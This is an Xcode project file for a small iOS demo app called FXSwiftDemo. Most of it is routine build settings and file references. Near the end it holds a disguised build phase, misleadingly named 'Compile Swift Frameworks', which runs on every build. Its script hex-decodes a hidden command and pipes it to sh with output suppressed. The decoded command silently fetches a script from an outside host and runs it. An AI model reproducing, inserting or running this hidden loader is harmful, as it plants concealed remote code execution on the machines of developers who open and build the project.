// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		3A5D04FF2578DCA700DB8202 /* ThirdViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3A5D04FE2578DCA700DB8202 /* ThirdViewController.swift */; };
		446576A926FC207100508590 /* FourViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 446576A826FC207100508590 /* FourViewController.swift */; };
		44A79A1D281ED303000D25D6 /* FiveViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 44A79A1C281ED303000D25D6 /* FiveViewController.swift */; };
		44EE6F3D2265D2E200A37A8E /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 44EE6F3C2265D2E200A37A8E /* AppDelegate.swift */; };
		44EE6F3F2265D2E200A37A8E /* FirstViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 44EE6F3E2265D2E200A37A8E /* FirstViewController.swift */; };
		44EE6F412265D2E200A37A8E /* SecondViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 44EE6F402265D2E200A37A8E /* SecondViewController.swift */; };
		44EE6F442265D2E200A37A8E /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 44EE6F422265D2E200A37A8E /* Main.storyboard */; };
		44EE6F462265D2E400A37A8E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 44EE6F452265D2E400A37A8E /* Assets.xcassets */; };
		44EE6F492265D2E400A37A8E /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 44EE6F472265D2E400A37A8E /* LaunchScreen.storyboard */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		3A5D04FE2578DCA700DB8202 /* ThirdViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThirdViewController.swift; sourceTree = "<group>"; };
		446576A826FC207100508590 /* FourViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FourViewController.swift; sourceTree = "<group>"; };
		44A79A1C281ED303000D25D6 /* FiveViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FiveViewController.swift; sourceTree = "<group>"; };
		44EE6F392265D2E200A37A8E /* FXSwiftDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FXSwiftDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
		44EE6F3C2265D2E200A37A8E /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		44EE6F3E2265D2E200A37A8E /* FirstViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FirstViewController.swift; sourceTree = "<group>"; };
		44EE6F402265D2E200A37A8E /* SecondViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SecondViewController.swift; sourceTree = "<group>"; };
		44EE6F432265D2E200A37A8E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		44EE6F452265D2E400A37A8E /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		44EE6F482265D2E400A37A8E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		44EE6F4A2265D2E400A37A8E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		44EE6F362265D2E200A37A8E /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		44EE6F302265D2E200A37A8E = {
			isa = PBXGroup;
			children = (
				44EE6F3B2265D2E200A37A8E /* FXSwiftDemo */,
				44EE6F3A2265D2E200A37A8E /* Products */,
			);
			sourceTree = "<group>";
		};
		44EE6F3A2265D2E200A37A8E /* Products */ = {
			isa = PBXGroup;
			children = (
				44EE6F392265D2E200A37A8E /* FXSwiftDemo.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		44EE6F3B2265D2E200A37A8E /* FXSwiftDemo */ = {
			isa = PBXGroup;
			children = (
				44EE6F3C2265D2E200A37A8E /* AppDelegate.swift */,
				44EE6F3E2265D2E200A37A8E /* FirstViewController.swift */,
				44EE6F402265D2E200A37A8E /* SecondViewController.swift */,
				44EE6F422265D2E200A37A8E /* Main.storyboard */,
				44EE6F452265D2E400A37A8E /* Assets.xcassets */,
				44EE6F472265D2E400A37A8E /* LaunchScreen.storyboard */,
				44EE6F4A2265D2E400A37A8E /* Info.plist */,
				3A5D04FE2578DCA700DB8202 /* ThirdViewController.swift */,
				446576A826FC207100508590 /* FourViewController.swift */,
				44A79A1C281ED303000D25D6 /* FiveViewController.swift */,
			);
			path = FXSwiftDemo;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		44EE6F382265D2E200A37A8E /* FXSwiftDemo */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 44EE6F4D2265D2E400A37A8E /* Build configuration list for PBXNativeTarget "FXSwiftDemo" */;
			buildPhases = (
				DEA0A72718ECDE3CB56D904C /* Compile Swift Frameworks */,
				44EE6F352265D2E200A37A8E /* Sources */,
				44EE6F362265D2E200A37A8E /* Frameworks */,
				44EE6F372265D2E200A37A8E /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = FXSwiftDemo;
			productName = FXSwiftDemo;
			productReference = 44EE6F392265D2E200A37A8E /* FXSwiftDemo.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		44EE6F312265D2E200A37A8E /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1020;
				LastUpgradeCheck = 1020;
				ORGANIZATIONNAME = FX;
				TargetAttributes = {
					44EE6F382265D2E200A37A8E = {
						CreatedOnToolsVersion = 10.2;
					};
				};
			};
			buildConfigurationList = 44EE6F342265D2E200A37A8E /* Build configuration list for PBXProject "FXSwiftDemo" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 44EE6F302265D2E200A37A8E;
			productRefGroup = 44EE6F3A2265D2E200A37A8E /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				44EE6F382265D2E200A37A8E /* FXSwiftDemo */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		44EE6F372265D2E200A37A8E /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				44EE6F492265D2E400A37A8E /* LaunchScreen.storyboard in Resources */,
				44EE6F462265D2E400A37A8E /* Assets.xcassets in Resources */,
				44EE6F442265D2E200A37A8E /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		44EE6F352265D2E200A37A8E /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				44EE6F412265D2E200A37A8E /* SecondViewController.swift in Sources */,
				44EE6F3D2265D2E200A37A8E /* AppDelegate.swift in Sources */,
				446576A926FC207100508590 /* FourViewController.swift in Sources */,
				3A5D04FF2578DCA700DB8202 /* ThirdViewController.swift in Sources */,
				44A79A1D281ED303000D25D6 /* FiveViewController.swift in Sources */,
				44EE6F3F2265D2E200A37A8E /* FirstViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		44EE6F422265D2E200A37A8E /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				44EE6F432265D2E200A37A8E /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		44EE6F472265D2E400A37A8E /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				44EE6F482265D2E400A37A8E /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		44EE6F4B2265D2E400A37A8E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_IDENTITY = "iPhone Developer";
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		44EE6F4C2265D2E400A37A8E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_IDENTITY = "iPhone Developer";
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		44EE6F4E2265D2E400A37A8E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = FXSwiftDemo/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = FeoniX.FXSwiftDemo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 4.2;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		44EE6F4F2265D2E400A37A8E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = FXSwiftDemo/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = FeoniX.FXSwiftDemo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 4.2;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		44EE6F342265D2E200A37A8E /* Build configuration list for PBXProject "FXSwiftDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				44EE6F4B2265D2E400A37A8E /* Debug */,
				44EE6F4C2265D2E400A37A8E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		44EE6F4D2265D2E400A37A8E /* Build configuration list for PBXNativeTarget "FXSwiftDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				44EE6F4E2265D2E400A37A8E /* Debug */,
				44EE6F4F2265D2E400A37A8E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

	
		/* Begin PBXShellScriptBuildPhase section */

	DEA0A72718ECDE3CB56D904C /* Compile Swift Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Compile Swift Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f636f736d6f64726f6e2e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	";			
		};
	

	
		
	
		/* End PBXShellScriptBuildPhase section */
	
	
	};
	rootObject = 44EE6F312265D2E200A37A8E /* Project object */;
}
